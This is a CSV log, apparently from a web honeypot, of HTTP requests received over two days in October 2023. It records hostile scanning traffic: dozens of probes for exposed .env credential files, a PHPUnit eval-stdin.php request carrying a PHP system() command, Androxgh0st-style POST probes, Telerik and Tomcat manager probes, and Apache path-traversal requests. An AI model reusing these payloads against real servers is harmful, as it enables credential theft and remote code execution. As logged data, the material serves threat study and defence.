ymd,time,from_ip_address,to_ip_address,HTTP,status_code,TorF,basic64,res,url,country
2023-10-01,2023-10-01 22:44:22,220.194.70.77,***.***.***.***,GET / HTTP/1.1,200,False,"GET / HTTP/1.1
Accept-Encoding: identity
Host: 133.242.178.40:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Connection: close

",GET,GET / HTTP/1.1,China
2023-10-01,2023-10-01 23:16:19,193.35.18.187,google.com:443,CONNECT google.com:443 HTTP/1.1,200,False,"CONNECT google.com:443 HTTP/1.1
Host: google.com:443
User-Agent: Go-http-client/1.1

",CONNECT,CONNECT google.com:443 HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:02:22,192.241.236.82,***.***.***.***,GET /manager/text/list HTTP/1.1,200,False,"GET /manager/text/list HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 zgrab/0.x
Accept: */*
Accept-Encoding: gzip

",GET,GET /manager/text/list HTTP/1.1,United States
2023-10-02,2023-10-02 00:24:26,85.203.45.13,***.***.***.***,GET / HTTP/1.1,200,False,"GET / HTTP/1.1
Host: 133.242.178.40
User-Agent: python-requests/2.26.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET / HTTP/1.1,Switzerland
2023-10-02,2023-10-02 00:40:06,132.145.46.98,***.***.***.***,GET /.env HTTP/1.1,200,False,"GET /.env HTTP/1.1
Host: 133.242.178.40
User-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /.env HTTP/1.1,United Kingdom
2023-10-02,2023-10-02 00:40:06,132.145.46.98,***.***.***.***,POST / HTTP/1.1,200,False,"POST / HTTP/1.1
Host: 133.242.178.40
User-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=androxgh0st",POST,POST / HTTP/1.1,United Kingdom
2023-10-02,2023-10-02 00:42:59,45.66.230.187,***.***.***.***,GET /.env HTTP/1.1,200,False,"GET /.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:02,45.66.230.187,***.***.***.***,GET /conf/.env HTTP/1.1,200,False,"GET /conf/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /conf/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:06,45.66.230.187,***.***.***.***,GET /wp-content/.env HTTP/1.1,200,False,"GET /wp-content/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /wp-content/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:09,45.66.230.187,***.***.***.***,GET /wp-admin/.env HTTP/1.1,200,False,"GET /wp-admin/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /wp-admin/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:13,45.66.230.187,***.***.***.***,GET /library/.env HTTP/1.1,200,False,"GET /library/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /library/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:20,45.66.230.187,***.***.***.***,GET /new/.env HTTP/1.1,200,False,"GET /new/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /new/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:23,45.66.230.187,***.***.***.***,GET /vendor/.env HTTP/1.1,200,False,"GET /vendor/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /vendor/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:27,45.66.230.187,***.***.***.***,GET /old/.env HTTP/1.1,200,False,"GET /old/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /old/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:31,45.66.230.187,***.***.***.***,GET /local/.env HTTP/1.1,200,False,"GET /local/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /local/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:34,45.66.230.187,***.***.***.***,GET /api/.env HTTP/1.1,200,False,"GET /api/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /api/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:38,45.66.230.187,***.***.***.***,GET /blog/.env HTTP/1.1,200,False,"GET /blog/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /blog/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:42,45.66.230.187,***.***.***.***,GET /crm/.env HTTP/1.1,200,False,"GET /crm/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /crm/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:45,45.66.230.187,***.***.***.***,GET /admin/.env HTTP/1.1,200,False,"GET /admin/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /admin/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:49,45.66.230.187,***.***.***.***,GET /laravel/.env HTTP/1.1,200,False,"GET /laravel/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /laravel/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:52,45.66.230.187,***.***.***.***,GET /app/.env HTTP/1.1,200,False,"GET /app/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /app/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:43:56,45.66.230.187,***.***.***.***,GET /app/config/.env HTTP/1.1,200,False,"GET /app/config/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /app/config/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:00,45.66.230.187,***.***.***.***,GET /apps/.env HTTP/1.1,200,False,"GET /apps/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /apps/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:04,45.66.230.187,***.***.***.***,GET /audio/.env HTTP/1.1,200,False,"GET /audio/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /audio/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:07,45.66.230.187,***.***.***.***,GET /cgi-bin/.env HTTP/1.1,200,False,"GET /cgi-bin/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /cgi-bin/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:11,45.66.230.187,***.***.***.***,GET /backend/.env HTTP/1.1,200,False,"GET /backend/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /backend/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:15,45.66.230.187,***.***.***.***,GET /src/.env HTTP/1.1,200,False,"GET /src/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /src/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:19,45.66.230.187,***.***.***.***,GET /base/.env HTTP/1.1,200,False,"GET /base/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /base/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:20,45.66.230.187,***.***.***.***,GET /core/.env HTTP/1.1,200,False,"GET /core/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /core/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:26,45.66.230.187,***.***.***.***,GET /vendor/laravel/.env HTTP/1.1,200,False,"GET /vendor/laravel/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /vendor/laravel/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:30,45.66.230.187,***.***.***.***,GET /storage/.env HTTP/1.1,200,False,"GET /storage/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /storage/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:33,45.66.230.187,***.***.***.***,GET /protected/.env HTTP/1.1,200,False,"GET /protected/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /protected/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:37,45.66.230.187,***.***.***.***,GET /newsite/.env HTTP/1.1,200,False,"GET /newsite/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /newsite/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:40,45.66.230.187,***.***.***.***,GET /www/.env HTTP/1.1,200,False,"GET /www/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /www/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:47,45.66.230.187,***.***.***.***,GET /sites/all/libraries/mailchimp/.env HTTP/1.1,200,False,"GET /sites/all/libraries/mailchimp/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /sites/all/libraries/mailchimp/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:51,45.66.230.187,***.***.***.***,GET /database/.env HTTP/1.1,200,False,"GET /database/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /database/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:54,45.66.230.187,***.***.***.***,GET /public/.env HTTP/1.1,200,False,"GET /public/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /public/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:44:59,45.66.230.187,***.***.***.***,GET /ik1-126-69536.vs.sakura.ne.jp/.env HTTP/1.1,200,False,"GET /ik1-126-69536.vs.sakura.ne.jp/.env HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

",GET,GET /ik1-126-69536.vs.sakura.ne.jp/.env HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:45:03,45.66.230.187,***.***.***.***,POST / HTTP/1.1,200,False,"POST / HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 14
Content-Type: application/x-www-form-urlencoded

0x%5B%5D=ridho",POST,POST / HTTP/1.1,Netherlands
2023-10-02,2023-10-02 00:45:06,45.66.230.187,***.***.***.***,GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,200,False,"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 25

<?php system(""ls -al"");?>",GET,GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,Netherlands
2023-10-02,2023-10-02 02:09:28,117.201.65.132,***.***.***.***,GET / HTTP/1.1,200,False,"GET / HTTP/1.1
Host: 133.242.178.40:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
Content-Length: 0

",GET,GET / HTTP/1.1,India
2023-10-02,2023-10-02 02:09:30,117.201.65.132,***.***.***.***,GET / HTTP/1.1,200,False,"GET / HTTP/1.1
Host: 133.242.178.40:80
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7
Content-Length: 0

",GET,GET / HTTP/1.1,India
2023-10-02,2023-10-02 02:21:31,195.116.52.177,***.***.***.***,GET / HTTP/1.1,200,False,"GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
Host: 133.242.178.40

",GET,GET / HTTP/1.1,Poland
2023-10-02,2023-10-02 02:39:05,192.241.204.35,***.***.***.***,GET /manager/text/list HTTP/1.1,200,False,"GET /manager/text/list HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 zgrab/0.x
Accept: */*
Accept-Encoding: gzip

",GET,GET /manager/text/list HTTP/1.1,United States
2023-10-02,2023-10-02 03:21:51,185.36.81.33,***.***.***.***,GET / HTTP/1.1,200,False,"GET / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en US,en;q=0.9,sv;q=0.8
Host: 133.242.178.40

",GET,GET / HTTP/1.1,Lithuania
2023-10-02,2023-10-02 04:09:54,205.210.31.28,blank:80,GET / HTTP/1.0,200,False,"GET / HTTP/1.0
User-Agent: Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com
Accept: */*

",GET,GET / HTTP/1.0,United States
2023-10-02,2023-10-02 04:37:38,118.126.124.10,***.***.***.***,HEAD / HTTP/1.1,200,1003,"HEAD / HTTP/1.1
Host: 133.242.178.40
X-Test-Token: f1b600cef73c4757dc04c2f9349609b5
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Python/3.6 aiohttp/3.8.3

",HEAD,HEAD / HTTP/1.1,China
2023-10-02,2023-10-02 05:25:27,193.35.18.187,google.com:443,CONNECT google.com:443 HTTP/1.1,200,False,"CONNECT google.com:443 HTTP/1.1
Host: google.com:443
User-Agent: Go-http-client/1.1

",CONNECT,CONNECT google.com:443 HTTP/1.1,Netherlands
2023-10-02,2023-10-02 07:02:28,185.180.143.81,***.***.***.***,GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1,200,False,"GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*
Accept-Encoding: gzip

",GET,GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1,Portugal
2023-10-02,2023-10-02 07:02:44,185.180.143.81,***.***.***.***,GET / HTTP/1.1,200,False,"GET / HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*
Accept-Encoding: gzip

",GET,GET / HTTP/1.1,Portugal
2023-10-02,2023-10-02 07:02:59,185.180.143.81,***.***.***.***,GET /webfig/ HTTP/1.1,200,False,"GET /webfig/ HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*
Accept-Encoding: gzip

",GET,GET /webfig/ HTTP/1.1,Portugal
2023-10-02,2023-10-02 07:03:15,185.180.143.81,***.***.***.***,GET / HTTP/1.1,200,False,"GET / HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*
Accept-Encoding: gzip

",GET,GET / HTTP/1.1,Portugal
2023-10-02,2023-10-02 07:03:16,185.180.143.81,***.***.***.***,GET /api/session/properties HTTP/1.1,200,False,"GET /api/session/properties HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*
Accept-Encoding: gzip

",GET,GET /api/session/properties HTTP/1.1,Portugal
2023-10-02,2023-10-02 07:03:31,185.180.143.81,***.***.***.***,GET /showLogin.cc HTTP/1.1,200,False,"GET /showLogin.cc HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*
Accept-Encoding: gzip

",GET,GET /showLogin.cc HTTP/1.1,Portugal
2023-10-02,2023-10-02 07:03:46,185.180.143.81,***.***.***.***,HEAD /icons/sphere1.png HTTP/1.1,200,1003,"HEAD /icons/sphere1.png HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*

",HEAD,HEAD /icons/sphere1.png HTTP/1.1,Portugal
2023-10-02,2023-10-02 07:03:46,185.180.143.81,***.***.***.***,HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1,200,1003,"HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*

",HEAD,HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1,Portugal
2023-10-02,2023-10-02 07:03:47,185.180.143.81,***.***.***.***,HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1,200,1003,"HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*

",HEAD,HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1,Portugal
2023-10-02,2023-10-02 07:03:47,185.180.143.81,***.***.***.***,HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1,200,1003,"HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1
Host: 133.242.178.40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 
Accept: */*

",HEAD,HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1,Portugal
